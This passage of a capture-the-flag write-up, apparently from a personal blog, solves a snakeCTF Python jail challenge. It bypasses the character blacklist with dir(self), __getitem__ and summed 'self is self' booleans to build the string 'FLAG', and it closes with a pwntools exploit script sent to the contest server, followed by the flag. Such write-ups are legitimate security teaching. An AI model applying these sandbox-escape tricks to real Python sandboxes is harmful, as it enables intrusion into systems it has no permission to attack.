+</span></span><span style="display:flex;"><span>            , <span style="color:#e6db74">&#39;X&#39;</span>, <span style="color:#e6db74">&#39;Y&#39;</span>, <span style="color:#e6db74">&#39;Z&#39;</span>, <span style="color:#e6db74">&#39;!&#39;</span>, <span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#39;#&#39;</span>, <span style="color:#e6db74">&#39;$&#39;</span>, <span style="color:#e6db74">&#39;%&#39;</span>
+</span></span><span style="display:flex;"><span>            , <span style="color:#e6db74">&#39;&amp;&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;-&#39;</span>, <span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">&#39;&lt;&#39;</span>, <span style="color:#e6db74">&#39;=&#39;</span>, <span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;@&#39;</span>
+</span></span><span style="display:flex;"><span>            , <span style="color:#e6db74">&#39;[&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;]&#39;</span>, <span style="color:#e6db74">&#39;^&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;{&#39;</span>, <span style="color:#e6db74">&#39;|&#39;</span>, <span style="color:#e6db74">&#39;}&#39;</span>, <span style="color:#e6db74">&#39;~&#39;</span>
+</span></span><span style="display:flex;"><span>            , <span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>, <span style="color:#e6db74">&#39;4&#39;</span>, <span style="color:#e6db74">&#39;5&#39;</span>, <span style="color:#e6db74">&#39;6&#39;</span>, <span style="color:#e6db74">&#39;7&#39;</span>, <span style="color:#e6db74">&#39;8&#39;</span>, <span style="color:#e6db74">&#39;9&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>allowed <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>printable:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> badchars:
+</span></span><span style="display:flex;"><span>        allowed<span style="color:#f92672">.</span>append(i)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(allowed)
+</span></span></code></pre></div><p>and the result was:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;b&#39;</span>, <span style="color:#e6db74">&#39;d&#39;</span>, <span style="color:#e6db74">&#39;e&#39;</span>, <span style="color:#e6db74">&#39;f&#39;</span>, <span style="color:#e6db74">&#39;g&#39;</span>, <span style="color:#e6db74">&#39;i&#39;</span>, <span style="color:#e6db74">&#39;l&#39;</span>, <span style="color:#e6db74">&#39;m&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>, <span style="color:#e6db74">&#39;s&#39;</span>, <span style="color:#e6db74">&#39;t&#39;</span>, <span style="color:#e6db74">&#39;v&#39;</span>, <span style="color:#e6db74">&#39;(&#39;</span>, <span style="color:#e6db74">&#39;)&#39;</span>, <span style="color:#e6db74">&#39;*&#39;</span>, <span style="color:#e6db74">&#39;+&#39;</span>, <span style="color:#e6db74">&#39;,&#39;</span>, <span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#e6db74">&#39;:&#39;</span>, <span style="color:#e6db74">&#39;_&#39;</span>, <span style="color:#e6db74">&#39; &#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0b</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0c</span><span style="color:#e6db74">&#39;</span>]
+</span></span></code></pre></div><p>We can see that with those chars we can compose different python keywords like <code>self</code> and <code>get_var</code>, which might be useful to print the flag. The only thing that we have to craft is the string “FLAG”, mainly because we are not  allowed to use those letters (obviously) and we can&rsquo;t use chars such as the backtick and the double qoutes.</p>
+<blockquote>
+<p>**How can we access the attributes inside <code>__init__</code> and use their names as strings?</p>
+</blockquote>
+<p>There is a python function called <code>dir</code> that lists all the methods, attributes and built-ins of an object. We can see that <code>__dir__</code> is blacklisted, while <code>dir</code> is not , this is a good starting point.</p>
+<blockquote>
+<p>**Now, what object do we pass to this function?</p>
+</blockquote>
+<p>Easy, we pass <code>self</code> as a parameter, which is a keyword that is used to indicate the object itself inside the class.</p>
+<p>From now on, to debug the payload, we executed the pyjail locally with a small change inside it: we removed the string “print” from the blacklist (and the characters of which the string “print” is composed), this was obviously done for debugging purpuses.
+So now let’s try locally our payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(dir(self))
+</span></span></code></pre></div><p>the result was:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#e6db74">&#39;F&#39;</span>, <span style="color:#e6db74">&#39;G&#39;</span>, <span style="color:#e6db74">&#39;L&#39;</span>, <span style="color:#e6db74">&#39;__class__&#39;</span>, <span style="color:#e6db74">&#39;__delattr__&#39;</span>, <span style="color:#e6db74">&#39;__dict__&#39;</span>, <span style="color:#e6db74">&#39;__dir__&#39;</span>, <span style="color:#e6db74">&#39;__doc__&#39;</span>, <span style="color:#e6db74">&#39;__eq__&#39;</span>,  
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;__format__&#39;</span>, <span style="color:#e6db74">&#39;__ge__&#39;</span>, <span style="color:#e6db74">&#39;__getattribute__&#39;</span>, <span style="color:#e6db74">&#39;__gt__&#39;</span>, <span style="color:#e6db74">&#39;__hash__&#39;</span>, <span style="color:#e6db74">&#39;__init__&#39;</span>,  
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;__init_subclass__&#39;</span>, <span style="color:#e6db74">&#39;__le__&#39;</span>, <span style="color:#e6db74">&#39;__lt__&#39;</span>, <span style="color:#e6db74">&#39;__module__&#39;</span>, <span style="color:#e6db74">&#39;__ne__&#39;</span>, <span style="color:#e6db74">&#39;__new__&#39;</span>,  
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;__reduce__&#39;</span>, <span style="color:#e6db74">&#39;__reduce_ex__&#39;</span>, <span style="color:#e6db74">&#39;__repr__&#39;</span>, <span style="color:#e6db74">&#39;__setattr__&#39;</span>, <span style="color:#e6db74">&#39;__sizeof__&#39;</span>, <span style="color:#e6db74">&#39;__str__&#39;</span>,  
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;__subclasshook__&#39;</span>, <span style="color:#e6db74">&#39;__weakref__&#39;</span>, <span style="color:#e6db74">&#39;get_var&#39;</span>, <span style="color:#e6db74">&#39;run_code&#39;</span>]  
+</span></span></code></pre></div><p>That’s exactly what we wanted: it returns a list containing the names of every built-ins, methods and attributes of the object, including also the strings <code>A</code>, <code>F</code>, <code>G</code>  and <code>L</code>.</p>
+<p>Now, thought, we have another problem:</p>
+<blockquote>
+<p>**how do we access these elements without using &ldquo;bad characters&rdquo;?</p>
+</blockquote>
+<p>Let&rsquo;s take a deeper look throught the built-ins methods by running:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(dir(dir(self))  
+</span></span></code></pre></div><p>the result was:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#e6db74">&#39;__add__&#39;</span>, <span style="color:#e6db74">&#39;__class__&#39;</span>, <span style="color:#e6db74">&#39;__class_getitem__&#39;</span>, <span style="color:#e6db74">&#39;__contains__&#39;</span>, <span style="color:#e6db74">&#39;__delattr__&#39;</span>,  
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;__delitem__&#39;</span>, <span style="color:#e6db74">&#39;__dir__&#39;</span>, <span style="color:#e6db74">&#39;__doc__&#39;</span>, <span style="color:#e6db74">&#39;__eq__&#39;</span>, <span style="color:#e6db74">&#39;__format__&#39;</span>, <span style="color:#e6db74">&#39;__ge__&#39;</span>,  
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;__getattribute__&#39;</span>, <span style="color:#e6db74">&#39;__getitem__&#39;</span>, <span style="color:#e6db74">&#39;__gt__&#39;</span>, <span style="color:#e6db74">&#39;__hash__&#39;</span>, <span style="color:#e6db74">&#39;__iadd__&#39;</span>, <span style="color:#e6db74">&#39;__imul__&#39;</span>,  
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;__init__&#39;</span>, <span style="color:#e6db74">&#39;__init_subclass__&#39;</span>, <span style="color:#e6db74">&#39;__iter__&#39;</span>, <span style="color:#e6db74">&#39;__le__&#39;</span>, <span style="color:#e6db74">&#39;__len__&#39;</span>, <span style="color:#e6db74">&#39;__lt__&#39;</span>, <span style="color:#e6db74">&#39;__mul__&#39;</span>,  
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;__ne__&#39;</span>, <span style="color:#e6db74">&#39;__new__&#39;</span>, <span style="color:#e6db74">&#39;__reduce__&#39;</span>, <span style="color:#e6db74">&#39;__reduce_ex__&#39;</span>, <span style="color:#e6db74">&#39;__repr__&#39;</span>, <span style="color:#e6db74">&#39;__reversed__&#39;</span>,  
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;__rmul__&#39;</span>, <span style="color:#e6db74">&#39;__setattr__&#39;</span>, <span style="color:#e6db74">&#39;__setitem__&#39;</span>, <span style="color:#e6db74">&#39;__sizeof__&#39;</span>, <span style="color:#e6db74">&#39;__str__&#39;</span>, <span style="color:#e6db74">&#39;__subclasshook__&#39;</span>,  
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;append&#39;</span>, <span style="color:#e6db74">&#39;clear&#39;</span>, <span style="color:#e6db74">&#39;copy&#39;</span>, <span style="color:#e6db74">&#39;count&#39;</span>, <span style="color:#e6db74">&#39;extend&#39;</span>, <span style="color:#e6db74">&#39;index&#39;</span>, <span style="color:#e6db74">&#39;insert&#39;</span>, <span style="color:#e6db74">&#39;pop&#39;</span>, <span style="color:#e6db74">&#39;remove&#39;</span>, <span style="color:#e6db74">&#39;reverse&#39;</span>,  
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;sort&#39;</span>]  
+</span></span></code></pre></div><p>The <code>__getitem__</code> method might be interesting for us, because it takes an index as a parameter and returns the element that is at that index inside of a list.<br>
+That’s perfect, but now we have another problem: we are not able to use numeric characters inside of our payload, so how can we solve this problem?</p>
+<p>We must first find a way to produce integer values as output, we may use a function that returns an integer and then use <code>+</code> or <code>*</code> to calculate the right index.<br>
+But we liked to think about it in an easier way: we know that conditional expressions return <code>True</code> or <code>False</code>, in short: 1 or 0, so we could sum the result of conditional expression in order to create the right index.</p>
+<p>But, again, we have something that blocks us: <code>&gt;</code>, <code>&lt;</code> and <code>=</code> are blacklisted, but these operators are not the only available, we can still use the <code>is</code> keyword (it checks if 2 objects are the same object).</p>
+<p>To create 1s and 0s we decided to use these expressions:</p>
+<ul>
+<li><code>self is self</code> -&gt; True -&gt; 1</li>
+<li><code>self is dir(self)</code> -&gt; False -&gt; 0</li>
+</ul>
+<p>**Now we have everything we need to write our payload and obtain the flag.</p>
+<p>We can divide the payload in 4 parts, each part will return a character we need to compose the string &ldquo;FLAG&rdquo;:</p>
+<ul>
+<li>‘F’ is at index 1: <code>dir(self).__getitem__(self is self)</code></li>
+<li>‘L’ is at index 3: <code>dir(self).__getitem__((self is self)+(self is self)+(self is self))</code></li>
+<li>‘A’ is at index 0: <code>dir(self).__getitem__(self is dir(self))</code></li>
+<li>‘G’ is at index 2: <code>dir(self).__getitem__((self is self)+(self is self))</code></li>
+</ul>
+<p>Now we can concatenate these chars to create our final payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>self<span style="color:#f92672">.</span>get_var(dir(self)<span style="color:#f92672">.</span>__getitem__(self <span style="color:#f92672">is</span> self) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>			 dir(self)<span style="color:#f92672">.</span>__getitem__((self <span style="color:#f92672">is</span> self) <span style="color:#f92672">+</span>	(self <span style="color:#f92672">is</span> self) <span style="color:#f92672">+</span> (self <span style="color:#f92672">is</span> self)) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>			 dir(self)<span style="color:#f92672">.</span>__getitem__(self <span style="color:#f92672">is</span> dir(self)) <span style="color:#f92672">+</span> 
+</span></span><span style="display:flex;"><span>			 dir(self)<span style="color:#f92672">.</span>__getitem__((self <span style="color:#f92672">is</span> self) <span style="color:#f92672">+</span> (self <span style="color:#f92672">is</span> self)))
+</span></span></code></pre></div><hr>
+<h2 id="final-exploit">Final Exploit:<a hidden class="anchor" aria-hidden="true" href="#final-exploit">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;misc.snakectf.org&#34;</span>, <span style="color:#ae81ff">1700</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>F <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dir(self).__getitem__(self is self)&#34;</span>
+</span></span><span style="display:flex;"><span>L <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dir(self).__getitem__((self is self) + (self is self) + (self is self))&#34;</span>
+</span></span><span style="display:flex;"><span>A <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dir(self).__getitem__(self is dir(self))&#34;</span>
+</span></span><span style="display:flex;"><span>G <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dir(self).__getitem__((self is self) + (self is self))&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;self.get_var(</span><span style="color:#e6db74">{</span>F<span style="color:#e6db74">}</span><span style="color:#e6db74">+</span><span style="color:#e6db74">{</span>L<span style="color:#e6db74">}</span><span style="color:#e6db74">+</span><span style="color:#e6db74">{</span>A<span style="color:#e6db74">}</span><span style="color:#e6db74">+</span><span style="color:#e6db74">{</span>G<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span><span style="color:#f92672">.</span>encode()
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, payload)
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><hr>
+<h2 id="flag">Flag:<a hidden class="anchor" aria-hidden="true" href="#flag">#</a></h2>
+<h4 id="snakectf7h3_574r_d1d_7h3_j0b"><code>snakeCTF{7h3_574r_d1d_7h3_j0b}</code><a hidden class="anchor" aria-hidden="true" href="#snakectf7h3_574r_d1d_7h3_j0b">#</a></h4>
+
+
+  </div>
+
+  <footer class="post-footer">
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://leo1.cc:5555/">leo_something</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script>
+    const images = Array.from(document.querySelectorAll(".post-content img"));
+    images.forEach(img => {
+        mediumZoom(img, {
+            margin: 0,  
+            scrollOffset: 40,  
+            container: null,  
+            template: null,  
+            background: 'rgba(0, 0, 0, 0.8)'
+        });
+    });
+</script>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
